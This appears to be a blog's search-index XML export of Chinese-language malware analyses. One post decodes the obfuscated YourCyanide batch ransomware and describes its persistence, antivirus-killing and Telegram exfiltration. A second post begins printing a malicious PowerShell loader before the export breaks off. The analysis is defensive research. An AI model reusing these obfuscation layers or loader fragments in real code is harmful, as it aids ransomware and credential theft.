<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>page</title>
      <link href="/page.html"/>
      <url>/page.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>基于CMD勒索脚本混淆分析</title>
      <link href="/YourCyanide_CMD-Based%20Ransomware.html"/>
      <url>/YourCyanide_CMD-Based%20Ransomware.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-spy-anyone-part-1-hacking-computers.1280x600.jpg"></p><span id="more"></span><p>在这篇博文中，我们将分析 YourCyanide，它是基于 CMD 的勒索软件系列的最新变体，始于 GonnaCope。YourCyanide 是一种复杂的勒索软件，它集成了 PasteBin、Discord 和 Microsoft 文档链接，作为其payload下载的一部分。YourCyanide 包含多层混淆，并利用自定义环境变量和启用延迟扩展功能来隐藏其活动。作为其规避策略的一部分，YourCyanide 还将通过不同的文件，通过 Discord 和 Pastebin 下载后续文件，然后最终下载主要有效负载。<br>使用vscode打开混淆脚本后，可以看到该代码为批处理脚本，同时为多处混淆内容。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446743553.png" alt="enter description here"><br>这些环境变量，因为这些值周围有两个%的百分比符号，比如%jVElq:<del>20,1%。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446772327.png" alt="enter description here"><br>接下来是设定值，这些基本上是数字值将从其索引并根据值返回字符或字符串的字母，从jVElq设置变量来看。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446794998.png" alt="enter description here"><br>打开cmd窗口，复制粘贴jVElq的变量，然后使用echo再去打印“%jVElq:</del>20,1%”，打印的结果为e。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446811939.png" alt="enter description here"><br>在vscode中按住ctrl+F使用查找并点击下图红框的按钮进行正则匹配“%jVElq:~[0-9]+,[0-9]+%”，可以看到进行模糊匹配关于jVElq环境变量。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446824364.png" alt="enter description here"><br>那么接下来写个脚本进行手工解密，用来理解混淆的思路，在vscode上新建一个文本文档，定义jVElq的字符串的值，定义obfuscation_cmd为YourCyanide.txt的第七行的值，为混淆的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">jVElq=<span class="string">&quot;yxlpdqajizrusokhbmnwefgctv&quot;</span></span><br><span class="line">obfuscation_cmd =<span class="string">&quot;@%jVElq:~20,1%%jVElq:~23,1%%jVElq:~15,1%%jVElq:~13,1% %jVElq:~13,1%%jVElq:~21,1%%jVElq:~21,1%&quot;</span></span><br><span class="line"><span class="comment">#定义obfuscation_cmd </span></span><br></pre></td></tr></table></figure><p>定义obfuscation_code的值 使用正则匹配 “ %jVElq:<del>[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:</del>20,1%等，同时将这些值放入新的列表中obfuscation_list。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obfuscation_list1=[]</span><br><span class="line">obfuscation_code1 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code1: </span><br><span class="line">    obfuscation_list1.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code1变量 使用正则匹配 “ %jVElq:~[0-9]+ ” 如obfuscation_cmd的%jVElq:~20%等。</span></span><br><span class="line"><span class="built_in">print</span> (obfuscation_list1)</span><br></pre></td></tr></table></figure><p>打印obfuscation_list1如下图红框。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446970337.png" alt="enter description here"><br>接着定义obfuscation_Sequence的值 ，使用正则匹配 jVElq 的序列匹配obfuscation_cmd 的数字，注释上面的obfuscation_list的代码，最后打印Sequence_list的列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obfuscation_Sequence= re.finditer(<span class="string">r&quot;\d+&quot;</span>,<span class="built_in">str</span>(obfuscation_list1)) </span><br><span class="line">Sequence_list=[]</span><br><span class="line"><span class="keyword">for</span> match2 <span class="keyword">in</span> obfuscation_Sequence: </span><br><span class="line">Sequence_list.append(jVElq[<span class="built_in">int</span>(match2.group())])</span><br><span class="line"><span class="built_in">print</span> (Sequence_list)</span><br><span class="line"><span class="comment">#定义obfuscation_Sequence的值 ，使用正则匹配 jVElq 的序列匹配obfuscation_cmd 的数字。</span></span><br></pre></td></tr></table></figure><p>打印出obfuscation_list的列表的值拼接起来就是echo off。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447168756.png" alt="enter description here"><br>再次定义obfuscation_code2变量 使用正则匹配 “ %jVElq:<del>[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:</del>20,1%等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eobfuscation_list2=[]</span><br><span class="line">obfuscation_code2 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+,[0-9]+%&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code2: </span><br><span class="line">    obfuscation_list2.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code2变量 使用正则匹配 “ %jVElq:~[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:~20,1%等。</span></span><br></pre></td></tr></table></figure><p>接下来去定义一个字典，将输出的对应的索引值与jVElq的值进行做成一个字典，注释掉上一个“print (Sequence_list)”，最后打印字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="comment">#dic 给一个空的字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(obfuscation_list2)):</span><br><span class="line">    dic_old = &#123;obfuscation_list2[i]:Sequence_list[i]&#125;</span><br><span class="line">    <span class="comment">#定义dic_old 添加&#123;obfuscation_list2：Sequence_list &#125;成为字典</span></span><br><span class="line">    dic.update(dic_old)</span><br><span class="line"><span class="built_in">print</span> (dic)</span><br></pre></td></tr></table></figure><p>打印出相对应的字典，同时可以看到去掉了一些重复的字符内容，如下图红框中的内容。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447333786.png" alt="enter description here"><br>最后进行将dic字典对应的字母与混淆的代码替换，然后重组打印，同样也是注释上面的“print (dic)”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line">    obfuscation_cmd = obfuscation_cmd.replace(key,dic[key])</span><br><span class="line"><span class="built_in">print</span>(obfuscation_cmd)</span><br><span class="line"><span class="comment">#将dic 字典对应的字母与混淆的代码替换，重组打印。</span></span><br></pre></td></tr></table></figure><p>可以看到这组对应的混淆代码经过手工解码后为字符串是“@echo off”。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447390971.png" alt="enter description here"></p><p>完整代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">jVElq=<span class="string">&quot;yxlpdqajizrusokhbmnwefgctv&quot;</span></span><br><span class="line">obfuscation_cmd =<span class="string">&quot;@%jVElq:~20,1%%jVElq:~23,1%%jVElq:~15,1%%jVElq:~13,1% %jVElq:~13,1%%jVElq:~21,1%%jVElq:~21,1%&quot;</span></span><br><span class="line"><span class="comment">#定义obfuscation_cmd变量 </span></span><br><span class="line"></span><br><span class="line">obfuscation_list1=[]</span><br><span class="line">obfuscation_code1 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code1: </span><br><span class="line">    obfuscation_list1.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code1变量 使用正则匹配 “ %jVElq:~[0-9]+ ” 如obfuscation_cmd的%jVElq:~20%等。</span></span><br><span class="line"><span class="comment">#print (obfuscation_list1)</span></span><br><span class="line">obfuscation_Sequence= re.finditer(<span class="string">r&quot;\d+&quot;</span>,<span class="built_in">str</span>(obfuscation_list1)) </span><br><span class="line"></span><br><span class="line">Sequence_list=[]</span><br><span class="line"><span class="keyword">for</span> match2 <span class="keyword">in</span> obfuscation_Sequence: </span><br><span class="line">    Sequence_list.append(jVElq[<span class="built_in">int</span>(match2.group())])</span><br><span class="line"><span class="comment">#print (Sequence_list)</span></span><br><span class="line"><span class="comment">#定义obfuscation_Sequence变量 ，使用正则匹配 jVElq 的序列匹配obfuscation_cmd 的数字。</span></span><br><span class="line"></span><br><span class="line">obfuscation_list2=[]</span><br><span class="line">obfuscation_code2 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+,[0-9]+%&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code2: </span><br><span class="line">    obfuscation_list2.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code2变量 使用正则匹配 “ %jVElq:~[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:~20,1%等。</span></span><br><span class="line"></span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="comment">#dic 给一个空的字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(obfuscation_list2)):</span><br><span class="line">    dic_old = &#123;obfuscation_list2[i]:Sequence_list[i]&#125;</span><br><span class="line">    <span class="comment">#定义dic_old 添加&#123;obfuscation_list2：Sequence_list &#125;成为字典</span></span><br><span class="line">    dic.update(dic_old)</span><br><span class="line"><span class="comment">#print (dic)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line">    obfuscation_cmd = obfuscation_cmd.replace(key,dic[key])</span><br><span class="line"><span class="built_in">print</span>(obfuscation_cmd)</span><br><span class="line"><span class="comment">#将dic 字典对应的字母与混淆的代码替换，重组打印。</span></span><br></pre></td></tr></table></figure><p>那么重新复制YourCyanide.txt的下图红框的内容，<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447468801.png" alt="enter description here"><br>粘贴并替换到python代码中obfuscation_cmd 的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obfuscation_cmd =<span class="string">&quot;&quot;&quot;@%jVElq:~20,1%%jVElq:~23,1%%jVElq:~15,1%%jVElq:~13,1% %jVElq:~13,1%%jVElq:~21,1%%jVElq:~21,1%</span></span><br><span class="line"><span class="string">%jVElq:~23,1%%jVElq:~2,1%%jVElq:~12,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1%%jVElq:~2,1%%jVElq:~13,1%%jVElq:~23,1%%jVElq:~6,1%%jVElq:~2,1% %jVElq:~20,1%%jVElq:~18,1%%jVElq:~6,1%%jVElq:~16,1%%jVElq:~2,1%%jVElq:~20,1%%jVElq:~20,1%%jVElq:~1,1%%jVElq:~24,1%%jVElq:~20,1%%jVElq:~18,1%%jVElq:~12,1%%jVElq:~8,1%%jVElq:~13,1%%jVElq:~18,1%%jVElq:~12,1% &amp;&amp; %jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1%%jVElq:~2,1%%jVElq:~13,1%%jVElq:~23,1%%jVElq:~6,1%%jVElq:~2,1% %jVElq:~20,1%%jVElq:~18,1%%jVElq:~6,1%%jVElq:~16,1%%jVElq:~2,1%%jVElq:~20,1%%jVElq:~4,1%%jVElq:~20,1%%jVElq:~2,1%%jVElq:~6,1%%jVElq:~0,1%%jVElq:~20,1%%jVElq:~4,1%%jVElq:~20,1%%jVElq:~1,1%%jVElq:~3,1%%jVElq:~6,1%%jVElq:~18,1%%jVElq:~12,1%%jVElq:~8,1%%jVElq:~13,1%%jVElq:~18,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1% %JSCUL:~23,1%%jVElq:~6,1%%JSCUL:~6,1%%jVElq:~1,1%%JSCUL:~0,1%=%ozMXz:~4,1%%ozMXz:~0,1%%ozMXz:~7,1%%ozMXz:~6,1%%ozMXz:~5,1%%ozMXz:~9,1%%ozMXz:~2,1%%ozMXz:~1,1%%ozMXz:~3,1%%ozMXz:~8,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1% %JSCUL:~20,1%%JSCUL:~6,1%%JSCUL:~17,1%%JSCUL:~25,1%%JSCUL:~19,1%=%JSCUL:~0,1%%JSCUL:~17,1%%JSCUL:~2,1%%JSCUL:~11,1%%JSCUL:~8,1%%JSCUL:~3,1%%JSCUL:~12,1%%JSCUL:~4,1%%JSCUL:~16,1%%JSCUL:~10,1%%JSCUL:~23,1%%JSCUL:~21,1%%JSCUL:~25,1%%JSCUL:~19,1%%JSCUL:~24,1%%JSCUL:~15,1%%JSCUL:~18,1%%JSCUL:~7,1%%JSCUL:~9,1%%JSCUL:~1,1%%JSCUL:~6,1%%JSCUL:~20,1%%JSCUL:~5,1%%JSCUL:~14,1%%JSCUL:~13,1%%JSCUL:~22,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1% %jVElq:~1,1%%jVElq:~11,1%%jVElq:~11,1%%jVElq:~18,1%%JSCUL:~3,1%=%jVElq:~24,1%%jVElq:~22,1%%jVElq:~9,1%%jVElq:~11,1%%jVElq:~15,1%%jVElq:~5,1%%jVElq:~23,1%%jVElq:~21,1%%jVElq:~3,1%%jVElq:~4,1%%jVElq:~25,1%%jVElq:~2,1%%jVElq:~13,1%%jVElq:~19,1%%jVElq:~0,1%%jVElq:~10,1%%jVElq:~20,1%%jVElq:~14,1%%jVElq:~16,1%%jVElq:~7,1%%jVElq:~1,1%%jVElq:~17,1%%jVElq:~18,1%%jVElq:~8,1%%jVElq:~6,1%%jVElq:~12,1%</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>最后打印改混淆前的代码，可以看到打印出的代码依稀可见一部分可读的字符串，同时还有一些混淆代码在里面，也就是刚刚解的是这组混淆的第一层代码。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447534499.png" alt="enter description here"><br>接下来使用工具一层层的解除混淆，打开【DecodeEnvType_4.exe】,点击右上角的clear按钮。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447546687.png" alt="enter description here"><br>复制全部【YourCyanide.txt】代码的内容，粘贴到【DecodeEnvType_4.exe】，同时填写设定值jVElq及字符串如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447577603.png" alt="enter description here"><br>点击Decode按钮，输出第一组的第一层的解码内容。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447588340.png" alt="enter description here"><br>接着解码第一组的第二层，重新填写设定值JSCUL及字符串如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447603346.png" alt="enter description here"><br>如遇到快捷键无法全选，则在input或者output，右键全选。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447621242.png" alt="enter description here"></p><p>接着解码第一组的第三层，重新填写设定值ozMXz及字符串如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447677972.png" alt="enter description here"><br>接着用第一组的密钥，解码第二组的混淆，依次类推，解完后如下。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447749140.png" alt="enter description here"><br>首先可以看到执行后，YourCyanide 将其文件属性设置为隐藏和系统文件，然后启动五个最大化的命令提示符窗口。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447780357.png" alt="enter description here"><br>然后它将尝试使用 net localgroup 命令将用户“session”添加到管理员组。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447788063.png" alt="enter description here"><br>它还通过在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 中创建注册表项，然后将自身复制到 Startup 目录来创建持久性的自动启动机制。它还通过修改其注册表项来禁用任务管理器。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447797471.png" alt="enter description here"><br>然后它检查 %SystemDrive%\AutoExec.bat 是否存在，如果存在，它会删除原始文件，然后复制自身并将文件设置为只读、隐藏并作为系统文件。<br>它还避免了具有以下用户名的机器，根据我们的研究，其中一些是恶意软件研究人员和沙盒系统使用的用户名，这意味着恶意软件作者正在注意哪些机器应该被规避，如下图所示<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447820798.png" alt="enter description here"><br>检查受感染机器的用户名后，它会在“UserProfile\Documents\black.bat” 中删除并执行一个批处理文件。此批处理文件负责不断打开空白屏幕保护程序文件，这会在恶意软件运行时使机器无法访问。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447832953.png" alt="enter description here"><br>YourCyanide 还通过连接变量以形成字符串“net stop”、“norton”、“symantec”和“McAfee”来终止多个服务和安全应用程序。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447842002.png" alt="enter description here"><br>以及还下载KillAVS脚本。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447851529.png" alt="enter description here"><br>打开找到killAVS.bat，打开后发现依旧是混淆，不过这个脚本混淆和前面部分不一样，只需挨个替换即可。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447898017.png" alt="enter description here"><br>如找到%ii%，与上面”set ii&#x3D;ne”对应，然后在vscode按住ctrl+F，替换全部即可。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447906426.png" alt="enter description here"></p><p>全部替换如下图所示，终止多个服务和安全应用程序：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447918750.png" alt="enter description here"><br>然后它使用 user32.dll 文件的 SwapMouseButton Export 函数交换鼠标按钮。<br>终止应用程序后，它将以下目录中的文件重命名为<random number>*<random number>.cyn，并使用 CMD shell 中名为 %random% 的内置变量将其内容覆盖为随机数。<br>尽管没有执行实际的加密，但由于文件被重命名，用户仍然会感到非常不便——尤其是对于那些在这些特定文件夹中有大量文件的人。此外，由于恶意软件目前仍在开发中，恶意软件作者很可能仍在完成例程的加密部分。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447934821.png" alt="enter description here"><br>然后它会创建以下赎金记录并将它们放入 %MyDesktop%。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447945101.png" alt="enter description here"><br>它具有两个实例，其中将自身复制到批处理文件，然后将恶意代码附加到win.ini和 system.ini。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447954735.png" alt="enter description here"><br>在执行其例程后，它会删除 %MyDocuments% 目录中的 black.bat 文件，该文件负责使机器无法访问。删除文件将阻止空白屏幕保护程序文件持续打开。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447964689.png" alt="enter description here"><br>YourCyanide 还能够通过电子邮件和不同的驱动器进行传播。它创建了两个 VBScript 文件 mail.vbs 和 loveletter.vbs，它们使用以下主题发送电子邮件（其本身作为附件）。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447983467.png" alt="enter description here"><br>绕过远程桌面连接和防火墙，YourCyanide 使用下图中所示的 netsh 命令启用远程桌面连接 (RDP)。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447993737.png" alt="enter description here"><br>然后它将 YourCyanide.cmd 转储到新创建的目录中。该文件的内容如下图所示。Dropper执行批处理脚本以从 Pastebin 获取内容并将其保存为 YourCyanide.cmd，这是用批处理脚本编写的实际勒索软件。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448016269.png" alt="enter description here"><br>打开ycynlog.bat，可以看到依旧是混淆，同样使用工具解码，这次只有一组。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448026081.png" alt="enter description here"><br>解到将output的内容，全选复制，并在vscode新建文本粘贴解码内容保存为decode_ycnlog.txt。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448049262.png" alt="enter description here"><br>ycynlog.cmd文件负责从受感染的机器中收集和泄露被盗信息。与主文件一样，它也具有多层混淆功能。执行后，文件会隐藏自身并通过在HKLM\Software\Microsoft\Windows\CurrentVersion\Run 中生成注册表项并将自身复制到 Startup 目录来创建其自动启动机制。<br>该恶意软件使用 Telegram聊天机器人API泄露被盗信息并将其设置为变量“Webhook”。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448061971.png" alt="enter description here"><br>它从Discord (GetToken.exe)下载另一个可执行文件。运行此可执行文件会创建文件 MyTokens.txt，其中包含来自不同应用程序（如 Chrome、Discord 和 Microsoft Edge）的被盗访问令牌数据。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448075792.png" alt="enter description here"><br>将GetToken.bin拖入peid工具中，可以发现是32位的C#程序。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448117996.png" alt="enter description here"><br>关闭PEID程序，将GetToken.bin拖入dnspy反编译工具，点击下图红框中的main函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448163459.png" alt="enter description here"><br>GetToken 是一个 C#的NET 程序，用于窃取用户的 Discord 令牌。窃取程序包含 Discord 的硬编码目录路径和各种 Web 浏览器的本地存储，如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448176796.png" alt="enter description here"><br>令牌通过使用正则表达式模式匹配来识别，如下所示。如果找到匹配项，窃取者通过调用函数 TokenUtil.checkToken 来检查令牌的有效性。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448186025.png" alt="enter description here"><br>令牌有效性是通过连接到Discord服务器并监控服务器响应来执行的。令牌检查例程如下所示。有效令牌返回给调用者函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448194831.png" alt="enter description here"><br>窃取者在受害者系统上创建一个文件 Tokens.txt 并转储找到的所有有效令牌。如果不存在令牌，写入 Tokens.txt 的值为“Retard Has No tokens”。勒索软件最终将 Token.txt发送到Telegram机器人。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448207204.png" alt="enter description here"><br>Tokens.txt 和 userdata.txt 都将使用 curl 命令通过 Telegram 聊天机器人 API 发送。还发现 YourCyanide 泄露了与 Minecraft相关的凭据。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448215657.png" alt="enter description here"><br>分析中，我们可以推断出恶意软件作者正在积极监控恶意软件研究人员创建的报告，方法是记录在沙箱日志和报告中发现的用户名，并将它们包括在用户名和具有多种功能的勒索软件变体（例如本博文中分析的变体）正越来越受欢迎。虽然 YourCyanide 及其其他变体目前的影响力不如其他系列，但它代表了对勒索软件工具包的一次有趣更新，将蠕虫、勒索软件和信息窃取程序捆绑到单个中间层勒索软件框架中。<br>这些勒索软件变种也很可能处于开发阶段，因此在它们进一步发展并造成更大破坏之前，优先检测和阻止它们。</p><p>参考链接：<a href="https://pcsxcetrasupport3.wordpress.com/2022/05/16/pealing-back-the-layers-of-a-batch-script-ransomware/">https://pcsxcetrasupport3.wordpress.com/2022/05/16/pealing-back-the-layers-of-a-batch-script-ransomware/</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>obfuscation_from_Excel_VBA_Part2</title>
      <link href="/obfuscation_from_Excel_VBA_2.html"/>
      <url>/obfuscation_from_Excel_VBA_2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/python-bundle-can-teach-you-everything-you-need-know.1280x600.jpg"></p><span id="more"></span><p>继续分析 4 个要下载的文件的列表。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478328293.png"></p><p>下载到本地继续分析。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107143634772.png" alt="image-20220107143634772"></p><p>下载文件后，它将使用该函数提取每个像素以及 B 和 G 颜色值，进行数学运算然后作为字符输出。<br>之后，它将传递从像素解码的 base64 字符串和 ([System.Version]).”nAME” 的结果，其计算结果为“Version”。该值用作解密中的密钥。<br>解密函数将使用派生密钥函数中 base64 编码数据的前 32 个字节。它还将使用传递的键值。HMAC 部分并不是真正需要正确解密数据。然后我们使用 RijndaelManaged 解密。<br>如果数据被正确解密，我们就会得到第一个字节 0x1F。这也告诉我们，无需查看其余代码，这就是 GZip 压缩数据输出。<br>虽然仍在解密函数中，但它会在返回另一个 base64 字符串之前对数据进行 GZip 解压缩。</p><p>更改脚本，更改为本地地址搭建个http服务端，再接着删除<code>&amp;(&quot;&#123;1&#125;&#123;0&#125;&quot; -f &#39;X&#39;,&#39;IE&#39;)</code>字符，因该函数为iex执行，删除后就可以直接输出结果。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107144454881.png" alt="image-20220107144454881"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107144642478.png" alt="image-20220107144642478"></p><p>输出内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107144752315.png" alt="image-20220107144752315"></p><p>看到$Fghg将被设置为一个值，需要 LCID，而文档为日语。则需找到日语的LCID即可</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145249283.png" alt="image-20220107145249283"></p><p>而LCID为1041</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145224776.png" alt="image-20220107145224776"></p><p>第一个值为408</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145525413.png" alt="image-20220107145525413"></p><p>则更改脚本如下，并去掉iex输出变量okkiis的值即可</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145606479.png" alt="image-20220107145606479"></p><p>同时再增加前面脚本的func OtTAsS和func bAvV</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152132397.png" alt="image-20220107152132397"></p><p>即如下完整脚本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107151823141.png" alt="image-20220107151823141"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$MmUz</span>=<span class="string">&#x27;base64 code&#x27;</span>;</span><br><span class="line">&amp;<span class="string">&#x27;sal&#x27;</span> oM <span class="built_in">new-ObJeCT</span>;.<span class="string">&#x27;Add-Type&#x27;</span> <span class="literal">-AssemblyName</span> <span class="string">&#x27;System.Drawing&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 